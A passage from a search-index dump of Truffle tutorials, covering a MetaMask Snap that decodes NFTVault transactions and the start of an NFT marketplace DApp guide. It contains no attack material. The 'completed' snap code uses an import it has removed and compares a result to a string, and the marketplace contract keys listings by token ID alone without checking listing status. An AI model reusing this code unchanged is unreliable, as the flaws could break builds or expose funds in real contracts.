@openzeppelin/contracts/interfaces/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/ERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/Counters.sol > Compiling @openzeppelin/contracts/utils/Strings.sol > Compiling @openzeppelin/contracts/utils/introspection/ERC165.sol > Compiling @openzeppelin/contracts/utils/introspection/IERC165.sol > Compiling @openzeppelin/contracts/utils/math/Math.sol > Artifacts written to /Users/emilylin/dev/unleashed/unleashed_mm_snap/packages/snap/src/contracts > Compiled successfully using: - solc: 0 .8.14+commit.80d49f37.Emscripten.clang Migrations dry-run ( simulation ) =============================== > Network name: 'development-fork' > Network id: 1 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contracts.js ===================== Deploying 'SimpleNFT' --------------------- > block number: 16190737 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .9367138314506932 > gas used: 2460810 ( 0x258c8a ) > gas price: 2 .794796691 gwei > value sent: 0 ETH > total cost: 0 .00687746364517971 ETH Deploying 'NFTVault' -------------------- > block number: 16190738 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .934619651128490245 > gas used: 757665 ( 0xb8fa1 ) > gas price: 2 .763992427 gwei > value sent: 0 ETH > total cost: 0 .002094180322202955 ETH ------------------------------------- > Total cost: 0 .008971643967382665 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .008971643967382665 ETH Starting migrations... ====================== > Network name: 'development' > Network id: 1 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contracts.js ===================== Deploying 'SimpleNFT' --------------------- > transaction hash: 0x0414b54b0b3cbe8714dbc8f73bc2faa3227685513064648f767e96d16069072f > Blocks: 0 Seconds: 0 > contract address: 0x888111C9F5Fe423154838060C4207BF1a0D267A2 > block number: 16190736 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .93671366001836455 > gas used: 2460810 ( 0x258c8a ) > gas price: 2 .794866356 gwei > value sent: 0 ETH > total cost: 0 .00687763507750836 ETH Deploying 'NFTVault' -------------------- > transaction hash: 0xb36b12cca3831a9d73ef958ba037682754193fa2312468ce349e4a8d2c1bbafe > Blocks: 0 Seconds: 0 > contract address: 0xa00b4BD107EAB10825ec93066aBF57162b11Ee44 > block number: 16190737 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .934619432428472905 > gas used: 757665 ( 0xb8fa1 ) > gas price: 2 .764054813 gwei > value sent: 0 ETH > total cost: 0 .002094227589891645 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .008971862667400005 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .008971862667400005 ETH", "title": "Edit packages/truffle/truffle-config.js"}, {"location": "guides/metamask-snap/#edit-packagessitesrcpagesindextsx", "text": "First, let's clean up the parts of the code we won't be using - specifically, remove any references to the HelloWorld snap: The sendHello and SendHelloButton imports The handleSendHelloClick function The sendHello card First, we'll want to change into the packages/site directory to start installing the ethers package there: cd ../site yarn add ethers Then, we'll add that as an import to the top of the packages/site/src/pages/index.tsx page and add useState and useEffect to the list of imports from react . We also want to use our contract information so we'll import the built Truffle files as well. import { useContext , useState , useEffect } from 'react' ; import { ethers } from 'ethers' ; import SimpleNFT from 'snap/src/contracts/SimpleNFT.json' ; import NFTVault from 'snap/src/contracts/NFTVault.json' ; If we want to interact with the smart contracts, we'll be using ethers to create a contract interface abstraction. To do this, we'll need the contract abi, address, and provider. Add the following code to the Index function: const [ networkId , setNetworkId ] = useState < unknown > (); useEffect (() => { const run = async () => { setNetworkId ( await window . ethereum . request ({ method : 'net_version' })); } const handleChainChanged = async () => { setNetworkId ( await window . ethereum . request ({ method : 'net_version' })); } window . ethereum . on ( 'chainChanged' , handleChainChanged ); run (); }, []); const simpleNFTContractAddress = networkId ? ( SimpleNFT . networks [ networkId ] ? SimpleNFT . networks [ networkId ]. address : null ) : null ; const simpleNFTInterface = new ethers . utils . Interface ( SimpleNFT . abi ); const NFTVaultContractAddress = networkId ? ( NFTVault . networks [ networkId ] ? NFTVault . networks [ networkId ]. address : null ) : null ; const NFTVaultInterface = NFTVaultContractAddress ? new ethers . utils . Interface ( NFTVault . abi ) : null ; To pull out the important pieces: We use await window.ethereum.request({ method: 'net_version' }) to get the networkId and listen for the chainChanged event in case the user changes networks We get address and abi information from truffle's build files We use new ethers.utils.Interface(SimpleNFT.abi) to get the contract interface abstraction for encoding Then, we simply add additional cards and relevant handlers to interact with the contract! Note that in this tutorial, we're deliberately encoding the function data ourselves instead of passing a ethers.Contract abstraction . This is because we want to demonstrate the encoding to decoding flow. In Index , add: const mintNFTHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const tokenURI = \"\" + data . get ( \"mintNFTtokenURI\" ); const functionData = simpleNFTInterface . encodeFunctionData ( 'mint' ,[ tokenURI ]); // Get the user's account from MetaMask. try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : simpleNFTContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const approveVaultHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const address = \"\" + data . get ( \"contractAddressToApprove\" ); const tokenId = parseInt ( data . get ( \"tokenIdToApprove\" )); const functionData = simpleNFTInterface . encodeFunctionData ( 'approve' ,[ NFTVaultContractAddress , tokenId ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : address , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const depositToVaultHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const nftAddress = \"\" + data . get ( \"nftAddressToDeposit\" ); const tokenId = parseInt ( data . get ( \"nftTokenIdToDeposit\" )); const secondSigner = \"\" + data . get ( \"secondSigner\" ); const functionData = NFTVaultInterface . encodeFunctionData ( 'depositNFT' ,[ nftAddress , tokenId , secondSigner ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : NFTVaultContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const approveWithdrawHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const nftAddress = \"\" + data . get ( \"nftAddressToApprove\" ); const tokenId = parseInt ( data . get ( \"nftTokenIdToApprove\" )); const functionData = NFTVaultInterface . encodeFunctionData ( 'approveWithdraw' ,[ nftAddress , tokenId ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : NFTVaultContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const withdrawHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const nftAddress = \"\" + data . get ( \"nftAddressToWithdraw\" ); const tokenId = parseInt ( data . get ( \"nftTokenIdToWithdraw\" )); const functionData = NFTVaultInterface . encodeFunctionData ( 'withdrawNFT' ,[ nftAddress , tokenId ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : NFTVaultContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; And then, at the end of the return in function in the list of cards, add: { simpleNFTContractAddress && ( < Card content = { { title : 'Mint an NFT' , description : ( < form id = \"mintNFT\" onSubmit = { mintNFTHandler } > < p >< label > TokenURI :< /label></p> < p >< input type = \"text\" name = \"mintNFTtokenURI\" id = \"mintNFTtokenURI\" />< /p> < button type = \"submit\" > Mint < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Approve the NFT Vault to hold your NFT' , description : ( < form id = \"approveVault\" onSubmit = { approveVaultHandler } > < p >< label > NFT Address :< /label></p> < p >< input type = \"text\" name = \"contractAddressToApprove\" id = \"contractAddressToApprove\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"tokenIdToApprove\" id = \"tokenIdToApprove\" />< /p> < button type = \"submit\" > Approve < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Deposit an NFT into the vault' , description : ( < form id = \"depositToVault\" onSubmit = { depositToVaultHandler } > < p >< em > Make sure you have approved the vault to hold this NFT !< /em></p> < p >< label > NFT Contract Address :< /label></p> < p >< input type = \"text\" name = \"nftAddressToDeposit\" id = \"nftAddressToDeposit\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"nftTokenIdToDeposit\" id = \"nftTokenIdToDeposit\" />< /p> < p >< label > Second signer for withdraw approval :< /label></p> < p >< input type = \"text\" name = \"secondSigner\" id = \"secondSigner\" />< /p> < button type = \"submit\" > Deposit < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Approve an NFT to be withdrawn' , description : ( < form id = \"approveWithdraw\" onSubmit = { approveWithdrawHandler } > < p >< em > Make sure you are calling this from the second signer !< /em></p> < p >< label > NFT Contract Address :< /label></p> < p >< input type = \"text\" name = \"nftAddressToApprove\" id = \"nftAddressToApprove\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"nftTokenIdToApprove\" id = \"nftTokenIdToApprove\" />< /p> < button type = \"submit\" > Approve Withdrawal < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Withdraw NFT' , description : ( < form id = \"withdraw\" onSubmit = { withdrawHandler } > < p >< em > Make sure the second signer has already approved this !< /em></p> < p >< label > NFT Contract Address :< /label></p> < p >< input type = \"text\" name = \"nftAddressToWithdraw\" id = \"nftAddressToWithdraw\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"nftTokenIdToWithdraw\" id = \"nftTokenIdToWithdraw\" />< /p> < button type = \"submit\" > Withdraw < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} To run through the entire life cycle you can take these steps: Import a funded account to your MetaMask wallet using the private keys generated by ganache Hit connect to install the snap Mint an NFT (you can put in an arbitrary string for the tokenURI). If this is the first mint, the token ID will be 1. Approve the NFTVault contract to transfer the NFT. Copy and paste the SimpleNFT address, which you can find in the SimpleNFT.json file or by calling truffle networks Deposit the NFT. For the second signer, use another pre-funded account number from the list of accounts generated by ganache Approve the withdrawal. Import the second signer account into your wallet by importing the private key. Switch and connect to that account to send the approval. Withdraw the NFT. You'll need to switch back to the original account in order to do the withdrawal.", "title": "Edit packages/site/src/pages/index.tsx"}, {"location": "guides/metamask-snap/#lets-build-the-snap", "text": "This snap will do a few things: It will be able to identify which smart contract we are calling If we are calling the NFTVault contract, it will identify what method we are calling If we are calling withdrawNFT , it will communicate whether or not the NFT is approved to be withdraw and who the approver is", "title": "Let's build the snap!"}, {"location": "guides/metamask-snap/#edit-packagessnapsnapmanifestjson", "text": "We'll need to give new permissions to your snap. To do so, add \"endowment:transaction-insight\": {} to initialPermissions . This permission gives the snap read-only access to raw transaction payloads before they are accepted for signing by the user.", "title": "Edit packages/snap/snap.manifest.json"}, {"location": "guides/metamask-snap/#edit-packagessnaptsconfigjson", "text": "In order to access the contract build files, we'll need to add this to the tsconfig.json file: \"compilerOptions\" : { \"resolveJsonModule\" : true }", "title": "Edit packages/snap/tsconfig.json"}, {"location": "guides/metamask-snap/#edit-packagessnapsrcindexts", "text": "Then, for our snap to use our transaction insight modify the imports: import { OnTransactionHandler , OnRpcRequestHandler , } from '@metamask/snap-types' ; import { getInsights } from './insights' ; Then, add the following function: /** * Handle an incoming transaction, and return any insights. * * @param args - The request handler args as object. * @param args.transaction - The transaction object. * @returns The transaction insights. */ export const onTransaction : OnTransactionHandler = async ({ transaction }) => { return { insights : await getInsights ( transaction ), }; };", "title": "Edit packages/snap/src/index.ts"}, {"location": "guides/metamask-snap/#create-packagessnapsrcinsightsts", "text": "First, we'll need to install the necessary dependencies: cd ../snap yarn add @metamask/abi-utils ethers Then create a new file called insights.ts . Let's start out with the bare bones. Add this code in: import { add0x , bytesToHex , hasProperty , isObject , remove0x , } from '@metamask/utils' ; import { decode } from '@metamask/abi-utils' ; import { ethers } from 'ethers' ; import SimpleNft from './contracts/SimpleNFT.json' ; import NFTVault from './contracts/NFTVault.json' ; /** * As an example, get transaction insights by looking at the transaction data * and attempting to decode it. * * @param transaction - The transaction to get insights for. * @returns The transaction insights. */ export async function getInsights ( transaction : Record < string , unknown > ) { const returnObject : Record < string , unknown > = { message : 'Unknown transaction' , }; const networkId = await wallet . request ({ method : 'net_version' }); const SimpleNFTContractAddress = SimpleNft . networks [ networkId ] ? SimpleNft . networks [ networkId ]. address : null ; const NFTVaultContractAddress = NFTVault . networks [ networkId ] ? NFTVault . networks [ networkId ]. address : null ; try { // Check if the transaction has data. if ( ! isObject ( transaction ) || ! hasProperty ( transaction , 'data' ) || typeof transaction . data !== 'string' ) { throw \"Transaction data received is not an object.\" ; } switch ( transaction . to ) { case SimpleNFTContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the SimpleNFT.sol contract\" ; break ; case NFTVaultContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the NFTVault.sol contract\" ; break ; default : returnObject . message = \"I do not recognize the address \" + transaction . to ; } return returnObject ; } catch ( error ) { console . error ( error ); return returnObject ; } } In this code, we check the transaction.to property to see what the calling contract is. If you want to see this in action, we'll have to reinstall the snap. Go back to the browser and hit Reconnect . MetaMask should prompt you to reinstall. Note that the installation screen now has an additional permission, \"Fetch and display transaction insights.\" After confirming, mint an NFT. In your MetaMask wallet, the transaction window has a new tab, \"Typescript Example...\" Click on this tab to view your transaction insights output. You should see that the SimpleNFT contract address was recognized! In Solidity, the first 4 bytes of an encoded function (which we demonstrated in the packages/site portion of this tutorial), identify what the function is called. We can use this fact to translate what functions are actually being called by the NFTVault contract. In the NFTVault switch case statement, add: const transactionData = remove0x ( transaction . data ); // Get function signature, i.e., the first 4 bytes of the data. const functionSignature = transactionData . slice ( 0 , 8 ); let matchingFunction = '' ; switch ( functionSignature ) { case '4e1ca120' : matchingFunction = 'approveWithdraw(address,uint256)' ; break ; case '97be5523' : matchingFunction = 'depositNFT(address,uint256,address)' ; break ; case 'b537b269' : matchingFunction = 'removeApproval(address,uint256)' ; break ; case '6088e93a' : matchingFunction = 'withdrawNFT(address,uint256)' ; break ; default : break ; } if ( matchingFunction . length > 0 ) { returnObject . method = matchingFunction ; } After you reconnect your snap, you should see something like this: To get even more granular, let's actually decode the argument data when withdrawNFT is called. First, add this function, which will convert certain arguments which are not JSON serializable to strings: /** * The ABI decoder returns certain which are not JSON serializable. This * function converts them to strings. * * @param value - The value to convert. * @returns The converted value. */ function normalize4ByteValue ( value : unknown ) : unknown { if ( Array . isArray ( value )) { return value . map ( normalize4ByteValue ); } if ( value instanceof Uint8Array ) { return bytesToHex ( value ); } if ( typeof value === 'bigint' ) { return value . toString (); } return value ; } Then, in the NFTVault switch case, add: if ( matchingFunction === 'withdrawNFT(address,uint256)' ) { // This is a function name in the shape \"functionName(arg1Type,arg2Type,...)\", so // we do a simple slice to get the argument types. const parameterTypes = matchingFunction . slice ( matchingFunction . indexOf ( '(' ) + 1 , matchingFunction . indexOf ( ')' )) . split ( ',' ); // Decode the parameters using the ABI utils library. const decodedParameters = decode ( parameterTypes , add0x ( transactionData . slice ( 8 )), ); returnObject . args = decodedParameters . map ( normalize4ByteValue ); // now show them whether they are approved to withdraw or not returnObject . canWithdraw = 'No' ; try { const provider = new ethers . providers . Web3Provider ( wallet ); const vaultContract = new ethers . Contract ( NFTVaultContractAddress , NFTVault . abi , provider , ); const ethersReadResult = await vaultContract . getApproval (... returnObject . args ); if ( ethersReadResult . length === 3 && ethersReadResult [ 2 ] === true ) { returnObject . canWithdraw = 'Yes' ; } returnObject . readResult = ethersReadResult ; } catch ( err ) { returnObject . canWithdraw = ` ${ err } ` ; } } Now, when you call withdrawNFT , the snap should give you some information about whether or not the NFT can be withdrawn and who the owner and second signer are! Note that this function is reading data from the chain using the getApproval method. Because getApproval and withdrawNFT have the same arguments, we can pass those on to getApproval to see if the NFT is approved with withdrawal or not. Plus, as a bonus, the Snap could be updated to use this information: To tell the user the address of the second signer To tell them if they are attempting to withdraw an NFT they do not own To tell them if the NFT is not found (the first two values will be 0x0) The completed code looks like this: import { add0x , bytesToHex , hasProperty , isObject , remove0x , } from '@metamask/utils' ; import { decode } from '@metamask/abi-utils' ; import { ethers } from 'ethers' ; import NFTVault from './contracts/NFTVault.json' ; /** * As an example, get transaction insights by looking at the transaction data * and attempting to decode it. * * @param transaction - The transaction to get insights for. * @returns The transaction insights. */ export async function getInsights ( transaction : Record < string , unknown > ) { const returnObject : Record < string , any > = { message : 'Unknown transaction' , }; const networkId = await wallet . request ({ method : 'net_version' }); const SimpleNFTContractAddress = SimpleNft . networks [ networkId ] ? SimpleNft . networks [ networkId ]. address : null ; const NFTVaultContractAddress = NFTVault . networks [ networkId ] ? NFTVault . networks [ networkId ]. address : null ; try { // Check if the transaction has data. if ( ! isObject ( transaction ) || ! hasProperty ( transaction , 'data' ) || typeof transaction . data !== 'string' ) { throw \"Transaction data received is not an object.\" ; } switch ( transaction . to ) { case SimpleNFTContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the SimpleNFT.sol contract\" ; break ; case NFTVaultContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the NFTVault.sol contract\" ; const transactionData = remove0x ( transaction . data ); // Get function signature, i.e., the first 4 bytes of the data. const functionSignature = transactionData . slice ( 0 , 8 ); let matchingFunction = '' ; switch ( functionSignature ) { case '4e1ca120' : matchingFunction = 'approveWithdraw(address,uint256)' ; break ; case '97be5523' : matchingFunction = 'depositNFT(address,uint256,address)' ; break ; case 'b537b269' : matchingFunction = 'removeApproval(address,uint256)' ; break ; case '6088e93a' : matchingFunction = 'withdrawNFT(address,uint256)' ; break ; default : break ; } if ( matchingFunction . length > 0 ) { returnObject . method = matchingFunction ; } if ( matchingFunction === 'withdrawNFT(address,uint256)' ) { // This is a function name in the shape \"functionName(arg1Type,arg2Type,...)\", so // we do a simple slice to get the argument types. const parameterTypes = matchingFunction . slice ( matchingFunction . indexOf ( '(' ) + 1 , matchingFunction . indexOf ( ')' )) . split ( ',' ); // Decode the parameters using the ABI utils library. const decodedParameters = decode ( parameterTypes , add0x ( transactionData . slice ( 8 )), ); returnObject . args = decodedParameters . map ( normalize4ByteValue ); // now show them whether they are approved to withdraw or not returnObject . canWithdraw = 'No' ; try { const provider = new ethers . providers . Web3Provider ( wallet ); const vaultContract = new ethers . Contract ( NFTVaultContractAddress , NFTVault . abi , provider , ); const ethersReadResult = await vaultContract . getApproval (... returnObject . args ); if ( ethersReadResult . length === 3 && ethersReadResult [ 2 ] === 'true' ) { returnObject . canWithdraw = 'Yes' ; } returnObject . readResult = ethersReadResult ; } catch ( err ) { returnObject . canWithdraw = ` ${ err } ` ; } } } return returnObject ; } catch ( error ) { console . error ( error ); return returnObject ; } } /** * The ABI decoder returns certain which are not JSON serializable. This * function converts them to strings. * * @param value - The value to convert. * @returns The converted value. */ function normalize4ByteValue ( value : unknown ) : unknown { if ( Array . isArray ( value )) { return value . map ( normalize4ByteValue ); } if ( value instanceof Uint8Array ) { return bytesToHex ( value ); } if ( typeof value === 'bigint' ) { return value . toString (); } return value ; }", "title": "Create packages/snap/src/insights.ts"}, {"location": "guides/metamask-snap/#future-extensions", "text": "There's a lot of really cool stuff you can do with encoding and decoding! Check out Truffle's decoder and encoder libraries for more complex use cases. If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or hang with the Unleashed community in general, join our Discord ! You can ask Snaps related questions in the #Snaps-dev channel there. Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/nft-marketplace/", "text": "How to Build a NFT Marketplace DApp on Ethereum or Optimism \u00b6 Written by Emily Lin Overview \u00b6 Today, we're gonna build Bored Pets Marketplace, a simple NFT marketplace using Truffle , Infura , MetaMask , and Web3.js ! We'll start off with the basics and first show you how to deploy your ethereum contracts to Truffle's local blockchain, Ganache, and the Goerli testnet. Then, we'll show you how to covert those contracts over to Optimism and deploy on the Optimistic Goerli testnet. Note that this tutorial will not teach you Javascript and will only briefly go over some Solidity principles. Our marketplace has a core set of functionality: 1. Minting and listing an NFT 2. Buying and selling an NFT 3. Viewing listed NFTs, NFTs you own, and NFTs you are selling This tutorial was inspired by Nader Dabit's marketplace tutorial . His tutorial uses ethers.js and deploys to Polygon, both of which you can use Truffle with! The completed code for this tutorial lives here . Prerequisites \u00b6 System Requirements \u00b6 We will start with Truffle's Optimism box , scaffolding code to help get your Truffle project configured to start using Optimism asap! The README explains the project structure in more detail. At the very least, you'll need to install: Node.js , v12 or higher truffle ganache If you want to run Optimism locally, you'll need these preqrequisites too. Create an Infura account and project \u00b6 To connect your DApp to Ethereum, Optimism, and other networks, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it nft-marketplace . Since we're deploying to Optimism, go ahead and add the Optimistic Goerli endpoint. It'll ask you to sign up for a free trial. Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here . Add Optimistic Goerli to your wallet \u00b6 Let's add Optimistic Goerli to your list of available networks to your MetaMask wallet! To do so, open up the MetaMask extension, click on the network, and then click Add Network. Then, fill out the network properties (you can copy your Infura idf from your Infura project): Network Name: Optimistic Goerli New RPC URL: https://optimism-goerli.infura.io/v3/INFURA_PROJECT_ID Chain ID: 420 Currency Symbol: ETH Block Explorer URL: https://blockscout.com/optimism/goerli/ Get Optimistic Goerli Eth \u00b6 To use the Optimistic Goerli testnet, you'll need some test eth. To do so, you'll need to: Get some Goerli Eth. You can use this faucet , which will also give some Optimistic Goerli Eth Get some Optimstic Goerli Eth by bridging through their app: https://app.optimism.io/bridge/deposit VSCode \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VSCode! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Set Up Your Project \u00b6 Unbox Optimism \u00b6 To get started, we'll start off by unboxing Truffle's Optimism box. You can do this by calling truffle unbox optimism [FOLDER_NAME] or through the VSCode extension command palette! Go ahead and install the requisite packages as well. truffle unbox optimism nft-marketplace cd nft-marketplace Create your client folders \u00b6 We'll also be using Next.js and Tailwind CSS for our client. So, to get that set up, we'll use Next's create-next-app utility. npx create-next-app client Then, we'll download the Tailwind dependencies and populate its config. cd client npm install -D tailwindcss postcss autoprefixer npx tailwindcss init -p Edit tailwind.config.js module . exports = { content : [ \"./pages/**/*.{js,ts,jsx,tsx}\" , \"./components/**/*.{js,ts,jsx,tsx}\" , ], theme : { extend : {}, }, plugins : [], } And replace the code from styles/global.css @ tailwind base ; @ tailwind components ; @ tailwind utilities ; Edit the Truffle config files \u00b6 Since we'll be referencing your compiled contracts in the client, let's change contracts_build_directory in the Truffle config files: In truffle-config.js , change the value to './client/contracts/ethereum-contracts' . In truffle-config.ovm.js , change the value to './client/contracts/optimism-contracts' . Your top level folder structure should look like this! nft-marketplace \u251c\u2500\u2500 LICENSE \u251c\u2500\u2500 README.md \u251c\u2500\u2500 box-img-lg.png \u251c\u2500\u2500 box-img-sm.png \u251c\u2500\u2500 client \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 test \u251c\u2500\u2500 truffle-config.js \u2514\u2500\u2500 truffle-config.ovm.js Build the NFT Smart Contract \u00b6 Since we are first showing you how to deploy on Ethereum, we'll edit the SimpleStorage.sol contract under contracts/ethereum . Change the file name and contract name to BoredPetsNFT.sol . We'll need to install OpenZeppelin . First, switch back into your nft-marketplace directory cd .. npm install @openzeppelin/contracts The smart contract looks like this: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"@ openzeppelin / contracts / token / ERC721 / ERC721 . sol \"; import \" @openzeppelin / contracts / token / ERC721 / extensions / ERC721URIStorage . sol \"; import \" @openzeppelin / contracts / utils / Counters . sol \"; contract BoredPetsNFT is ERC721URIStorage { using Counters for Counters.Counter; Counters.Counter private _tokenIds; address marketplaceContract; event NFTMinted(uint256); constructor(address _marketplaceContract) ERC721(\" Bored Pets Yacht Club \", \" BPYC \") { marketplaceContract = _marketplaceContract; } function mint(string memory _tokenURI) public { _tokenIds.increment(); uint256 newTokenId = _tokenIds.current(); _safeMint(msg.sender, newTokenId); _setTokenURI(newTokenId, _tokenURI); setApprovalForAll(marketplaceContract, true); emit NFTMinted(newTokenId); } } Creating the NFT smart contract is short and sweet! Let's first take a look at the imports: @openzeppelin/contracts/token/ERC721/ERC721.sol To be a valid NFT, BoredPetNFT implements the ERC721 standard by inheriting the implementation of ERC721URIStorage.sol @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol This implementation of ERC721 is used so that we store the tokenURIs on chain in storage , which is what allows us to store the metadata we upload to IPFS off-chain. @openzeppelin/contracts/utils/Counters.sol We use a counter to track the total number of NFTs and assign a unique token id to each NFT. At the top we define a few variables: address marketplaceContract is the address of the Marketplace contract we'll be writing in the next section. event NFTMinted will be emitted every time a NFT is minted. When an event is emitted in solidity, the parameters are stored in the transaction's log. We will need the tokenId later when we build out the web app. And finally, we only need to define the mint function! It only has one parameter: - string memory _tokenURI points to the JSON metdata on IPFS that stores the NFT's metadata (i.e., image, name, description) mint is relatively straightforward - it mints an NFT with an increasing, unique token Id. Of note, however, is setApprovalForAll . This is important because our Marketplace contract will need approver access to transfer ownership of the NFT between various addresses. Build the Marketplace Contract \u00b6 Now, let's add a new contract Marketplace.sol under contracts/ethereum , which will store all the marketplace functionality. This'll be what it ends up like: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"@ openzeppelin / contracts / utils / Counters . sol \"; import \" @openzeppelin / contracts / token / ERC721 / ERC721 . sol \"; import \" @openzeppelin / contracts / security / ReentrancyGuard . sol \"; contract Marketplace is ReentrancyGuard { using Counters for Counters.Counter; Counters.Counter private _nftsSold; Counters.Counter private _nftCount; uint256 public LISTING_FEE = 0.0001 ether; address payable private _marketOwner; mapping(uint256 => NFT) private _idToNFT; struct NFT { address nftContract; uint256 tokenId; address payable seller; address payable owner; uint256 price; bool listed; } event NFTListed( address nftContract, uint256 tokenId, address seller, address owner, uint256 price ); event NFTSold( address nftContract, uint256 tokenId, address seller, address owner, uint256 price ); constructor() { _marketOwner = payable(msg.sender); } // List the NFT on the marketplace function listNft(address _nftContract, uint256 _tokenId, uint256 _price) public payable nonReentrant { require(_price > 0, \" Price must be at least 1 wei \"); require(msg.value == LISTING_FEE, \" Not enough ether for listing fee \"); IERC721(_nftContract).transferFrom(msg.sender, address(this), _tokenId); _marketOwner.transfer(LISTING_FEE); _nftCount.increment(); _idToNFT[_tokenId] = NFT( _nftContract, _tokenId, payable(msg.sender), payable(address(this)), _price, true ); emit NFTListed(_nftContract, _tokenId, msg.sender, address(this), _price); } // Buy an NFT function buyNft(address _nftContract, uint256 _tokenId) public payable nonReentrant { NFT storage nft = _idToNFT[_tokenId]; require(msg.value >= nft.price, \" Not enough ether to cover asking price \"); address payable buyer = payable(msg.sender); payable(nft.seller).transfer(msg.value); IERC721(_nftContract).transferFrom(address(this), buyer, nft.tokenId); nft.owner = buyer; nft.listed = false; _nftsSold.increment(); emit NFTSold(_nftContract, nft.tokenId, nft.seller, buyer, msg.value); } // Resell an NFT purchased from the marketplace function resellNft(address _nftContract, uint256 _tokenId, uint256 _price) public payable nonReentrant { require(_price > 0, \" Price must be at least 1 wei \"); require(msg.value == LISTING_FEE, \" Not enough ether for listing fee \"); IERC721(_nftContract).transferFrom(msg.sender, address(this), _tokenId); NFT storage nft = _idToNFT[_tokenId]; nft.seller = payable(msg.sender); nft.owner = payable(address(this)); nft.listed = true; nft.price = _price; _nftsSold.decrement(); emit NFTListed(_nftContract, _tokenId, msg.sender, address(this), _price); } function getListedNfts() public view returns (NFT[] memory) { uint256 nftCount = _nftCount.current(); uint256 unsoldNftsCount = nftCount - _nftsSold.current(); NFT[] memory nfts = new NFT[](unsoldNftsCount); uint nftsIndex = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].listed) { nfts[nftsIndex] = _idToNFT[i + 1]; nftsIndex++; } } return nfts; } function getMyNfts() public view returns (NFT[] memory) { uint nftCount = _nftCount.current(); uint myNftCount = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].owner == msg.sender) { myNftCount++; } } NFT[] memory nfts = new NFT[](myNftCount); uint nftsIndex = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i 